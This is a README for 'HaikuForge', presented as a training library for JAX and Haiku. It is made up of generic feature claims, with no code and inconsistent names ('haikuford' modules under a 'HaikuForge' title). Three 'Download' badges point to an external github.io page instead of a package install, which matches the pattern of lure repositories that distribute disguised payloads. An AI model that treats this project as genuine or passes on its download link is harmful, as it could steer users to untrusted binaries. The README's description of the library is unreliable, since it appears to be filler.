![preview](https://raw.githubusercontent.com/GabrielNicolas10/haiku-forge/main/promo_dfaff.svg)
[![Download](https://raw.githubusercontent.com/GabrielNicolas10/haiku-forge/main/bin_ababa.svg)](https://GabrielNicolas10.github.io/haiku-forge/)

# 🧠 HaikuForge — Model Training Companion for JAX & Haiku

An opinionated, batteries-included training companion for building, orchestrating, and monitoring neural networks written with `dm-haiku`. HaikuForge is designed for researchers and engineers who want the elegance of functional JAX models with the ergonomics of a full training stack — without surrendering control over every gradient, optimizer state, or checkpoint.

This project is a fully independent reimagining inspired by the original `haiku_trainer` helper library, reworked from the ground up into a modular, extensible, and production-friendly framework.

[![Download](https://raw.githubusercontent.com/GabrielNicolas10/haiku-forge/main/bin_ababa.svg)](https://GabrielNicolas10.github.io/haiku-forge/)

---

## 📚 Table of Contents

- [Overview](#-overview)
- [Why HaikuForge?](#-why-haikuford)
- [Feature Highlights](#-feature-highlights)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Core Modules](#-core-modules)
- [Quick Start Walkthrough](#-quick-start-walkthrough)
- [Configuration Philosophy](#-configuration-philosophy)
- [Multilingual Documentation Support](#-multilingual-documentation-support)
- [Responsive Dashboard & UI](#-responsive-dashboard--ui)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Extending HaikuForge](#-extending-haikuford)
- [Performance & Precision](#-performance--precision)
- [Reproducibility Guarantees](#-reproducibility-guarantees)
- [Testing Strategy](#-testing-strategy)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🔭 Overview

Training a Haiku model often means stitching together a patchwork of utilities: an optimizer wrapper here, a metric aggregator there, a checkpoint saver written three times over across three projects. HaikuForge replaces that patchwork with a single, coherent loom — everything threads together, and every strand is visible and replaceable.

HaikuForge gives you:

- A declarative way to describe a training run.
- A pluggable data pipeline that doesn't fight your existing `tf.data` or array-based loaders.
- A metrics engine that tracks, aggregates, and exports without ceremony.
- A checkpoint layer that is deterministic, portable, and version-aware.
- A monitoring surface that is readable in a notebook, a terminal, and a browser.

The library is intentionally small at its core and expansive at its edges. You can adopt one module and ignore the rest, or embrace the whole ensemble.

---

## 💡 Why HaikuForge?

Most training helpers assume you want *their* abstractions. HaikuForge assumes you want *yours*, and just need the scaffolding to be reliable.

1. **Functional-first.** Haiku models are pure functions over parameters. HaikuForge never hides that — it leans into it.
2. **State you can see.** Optimizer state, EMA state, metric state, RNG state — all inspectable, all serializable, all documented.
3. **Swap-in, swap-out.** Any component (optimizer, scheduler, logger, checkpoint backend) can be replaced with a custom implementation via a small interface.
4. **Composable schedules.** Learning rate schedules, warmups, and decay policies can be chained into expressive compositions.
5. **Predictable defaults.** Sensible starting points mean you can go from a bare model definition to a running experiment quickly, then refine later.

---

## ✨ Feature Highlights

- 🧩 **Modular Trainer API** — assemble a trainer from independently testable components.
- ⚡ **JIT-Friendly Loop** — designed around `jax.jit`, `jax.vmap`, and `jax.grad` without hidden Python overhead.
- 📊 **Metrics Aggregation** — running means, weighted averages, percentile tracking, and per-step logging.
- 💾 **Deterministic Checkpointing** — orbit-style sharded saves with manifest versioning.
- 🔁 **Resumable Runs** — pick up exactly where you left off, including RNG streams.
- 🎛️ **Declarative Config** — describe experiments in structured configs, not scattered flags.
- 🧪 **Experiment Variants** — sweep hyperparameters with named variants and stable hashes.
- 🖥️ **Responsive Dashboard** — a UI that adapts gracefully from a phone screen to a wall of monitors.
- 🌐 **Multilingual Support** — documentation and dashboard labels localized across several languages.
- 🕐 **Round-the-Clock Assistance** — support channels staffed continuously so you are never stuck alone at 3 a.m.
- 🧷 **Extensive Hooks** — lifecycle callbacks at every meaningful point in a training run.
- 🔒 **Reproducible Seeds** — a single seed fans out into deterministic per-shard PRNG keys.
- 🧭 **Profiler Integration** — trace, sample, and export performance data without extra plumbing.

---

## 🏗️ Architecture at a Glance

HaikuForge is organized as a layered stack. Each layer depends only on the layers beneath it, which keeps the surface area disciplined.

| Layer | Responsibility | Key Concepts |
|-------|----------------|--------------|
| Data | Feeding batches | Loaders, sharding, prefetch |
| Model | Wrapping Haiku modules | Init, apply, parameter trees |
| Optimization | Applying gradients | Optimizers, schedules, clipping |
| Training | Driving the loop | Steps, epochs, hooks |
| Persistence | Saving & restoring | Checkpoints, manifests, retention |
| Observability | Reporting progress | Metrics, loggers, dashboards |

This layering means you can, for example, reuse the Optimization layer inside a custom loop while ignoring the Training layer entirely.

---

## 🧱 Core Modules

### `haikuford.runtime`
The conductor of the orchestra. It owns the training loop, the step counter, and the lifecycle hooks.

- `Trainer` — the primary entry point.
- `LoopState` — an immutable snapshot of everything a loop needs.
- `HookRegistry` — attach callbacks to events like `on_step_end`, `on_epoch_end`, `on_checkpoint`.

### `haikuford.optim`
Wrappers around Optax and friends, plus schedule composition.

- `build_optimizer(config)` — turn a config into a ready optimizer.
- `ScheduleChain` — compose warmup, cosine decay, and restarts.
- `gradient_clip(mode, value)` — norm, value, or adaptive clipping.

### `haikuford.metrics`
Aggregation and export.

- `MetricAccumulator` — running statistics with resets.
- `MovingAverage` — windowed or exponential.
- `HistogramTracker` — bucketized distributions for reporting.

### `haikuford.checkpoint`
Persistence with a manifest.

- `save_state(path, state, manifest)` — durable writes with atomic rename.
- `load_state(path, manifest)` — safe restore with validation.
- `RetentionPolicy` — keep the best N or the newest N.

### `haikuford.data`
Loaders that cooperate with JAX rather than fight it.

- `ArrayLoader` — in-memory shards.
- `StreamLoader` — iterable-backed streaming with prefetch.
- `ShardPlan` — deterministic device-to-shard mapping.

### `haikuford.report`
Human-facing output.

- `ConsoleReporter` — a clean, columnar summary.
- `NotebookReporter` — inline progress suitable for interactive sessions.
- `DashboardServer` — a lightweight, responsive UI.

---

## 🚀 Quick Start Walkthrough

The walkthrough below sketches the intended flow. It is illustrative — adapt names and shapes to your own project.

**Step one: define a Haiku module.**

Describe a small MLP using standard `hk.Module` conventions. Nothing here is HaikuForge-specific; your existing modules work unchanged.

**Step two: describe a run.**

Create a config object that names the module, the optimizer, the loader, and the reporting destinations. The config is plain data — it can be parsed from a file, built in Python, or generated by a sweep tool.

**Step three: instantiate the trainer.**

Hand the config and the module to `Trainer`. The trainer initializes parameters, builds the optimizer, and prepares the checkpoint directory.

**Step four: run.**

Call `trainer.fit()`. The loop runs, hooks fire, metrics accumulate, and checkpoints appear on disk according to your retention policy.

**Step five: inspect.**

Open the dashboard, read the console reporter, or load the metrics export into your favorite plotting tool. Everything is available in structured form.

For detailed narrative guidance, see the `docs/` folder in this repository.

---

## ⚙️ Configuration Philosophy

HaikuForge treats configuration as a first-class artifact.

- **Explicit over implicit.** Every value that affects a run is written down somewhere.
- **Hashed for stability.** Configurations are hashed so that runs with identical settings share a fingerprint.
- **Layered.** Base configs can be inherited and overridden by variant configs.
- **Typed.** Misconfigurations surface early, before a single gradient is computed.

A configuration is not merely a bag of flags — it is the recipe that, combined with data and code, uniquely identifies your experiment.

---

## 🌐 Multilingual Documentation Support

Research teams are global. HaikuForge ships documentation scaffolding that supports translation into multiple languages.

- Locale-aware docstrings and doc pages.
- A translation catalog that can be extended by contributors.
- Dashboard strings pulled from locale files rather than hardcoded.

Initial locales focus on broad coverage, with community contributions welcomed for additional languages. If you speak a language underrepresented in machine learning tooling, your help is especially valuable.

---

## 🖥️ Responsive Dashboard & UI

The optional dashboard is designed to be useful on any screen.

- **Adaptive layout** — grids reflow for narrow windows and mobile browsers.
- **Keyboard-first navigation** — jump between panels without a mouse.
- **Low-bandwidth friendly** — updates are incremental and lightweight.
- **Theme-aware** — respects light and dark preferences.
- **Accessible** — semantic markup and sensible contrast by default.

The dashboard is a convenience, not a requirement. Every metric it displays is also available programmatically.

---

## 🕐 Round-the-Clock Assistance

Training runs do not respect office hours, and neither does support.

- A continuously monitored discussion channel where maintainers and community members answer questions.
- A rotating triage rota ensures that issues filed overnight receive attention before the next working day.
- Documented escalation paths for blockers that stall active research.
- A knowledge base that grows from every resolved question.

The aim is simple: no one should be blocked for long on a question that has already been answered somewhere.

---

## 🧬 Extending HaikuForge

Extension is expected, not exceptional.

- **Custom hooks** — subclass the hook interface and register it.
- **Custom reporters** — implement the reporter protocol to emit to your own backend.
- **Custom checkpoint backends** — support object stores, network filesystems, or in-memory stores.
- **Custom schedulers** — write a pure function over step counts and plug it into a `ScheduleChain`.
- **Custom metric aggregators** — anything that consumes a batch and returns scalars.

Interfaces are intentionally narrow so that extensions remain testable in isolation.

---

## ⚡ Performance & Precision

HaikuForge is written with performance in mind, but never at the cost of clarity.

- **Asynchronous dispatch** — the loop issues work without blocking on host synchronization.
- **Donation-aware** — buffers are donated where safe to reduce allocation churn.
- **Precision policies** — mixed precision supported via explicit policy objects.
- **Device placement** — sharding maps are explicit and auditable.
- **Overhead budget** — the trainer's own Python overhead is measured in benchmarks.

If you find a case where HaikuForge's overhead dominates your step time, that is a bug worth reporting.

---

## 🧪 Reproducibility Guarantees

Reproducibility is a feature, not an accident.

- A single master seed fans out deterministically into per-component keys.
- Checkpoint manifests record library version, config hash, and step count.
- Data loaders expose deterministic shuffling given a seed.
- Metric aggregation is order-independent where mathematically possible.

Given the same code, config, data, and seed, two runs should agree to the extent your hardware allows.

---

## 🧷 Testing Strategy

- Unit tests for every public function.
- Property-based tests for schedule composition and metric aggregation.
- Integration tests that run short training loops end to end.
- Golden-file tests for checkpoint manifests.
- Continuous integration across supported JAX versions.

Tests are treated as documentation of intended behavior. When behavior changes, tests change with it — deliberately and visibly.

---

## 🗺️ Roadmap for 2026

The 2026 roadmap focuses on deepening reliability and broadening reach.

- Expanded locale coverage for the dashboard.
- A richer set of built-in schedule primitives.
- First-class support for distributed multi-host runs.
- Streamlined experiment comparison tooling.
- Improved profiling summaries with actionable recommendations.
- A guided migration path from older helper libraries.

Priorities may shift as community feedback arrives; the issue tracker is the authoritative source.

---

## ❓ Frequently Asked Questions

**Does HaikuForge replace Haiku?**
No. It complements Haiku. Your modules remain Haiku modules.

**Can I use only part of the library?**
Yes. Modules are designed to stand alone.

**Does it support multiple accelerators?**
Yes, through explicit sharding plans.

**Is the dashboard mandatory?**
No. It is optional and can be disabled entirely.

**How do I report a bug?**
Open an issue with a minimal reproduction and your config hash.

**Where do I ask questions?**
The discussions area is the friendliest starting point.

---

## 🤝 Contributing

Contributions are welcome and appreciated.

- Read the contributing guide before opening a pull request.
- Keep changes focused and well-tested.
- Document new behavior in the docs folder.
- Follow the existing code style and naming conventions.
- Be kind in reviews — everyone is here to build something useful.

Small improvements matter. A clearer error message or a sharper docstring is a real contribution.

---

## 📄 License

This project is released under the MIT License. See the full text at the link below.

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 HaikuForge Contributors.

---

## ⚠️ Disclaimer

HaikuForge is provided as-is, without warranty of any kind, express or implied. The authors and contributors are not liable for any damages arising from the use of this software. Training machine learning models consumes compute, energy, and time — please plan accordingly.

Always review your data handling practices, respect licensing of datasets you use, and ensure your experiments comply with applicable laws and institutional policies. This project is a community effort and is not affiliated with any organization that may share a similar name.

---

[![Download](https://raw.githubusercontent.com/GabrielNicolas10/haiku-forge/main/bin_ababa.svg)](https://GabrielNicolas10.github.io/haiku-forge/)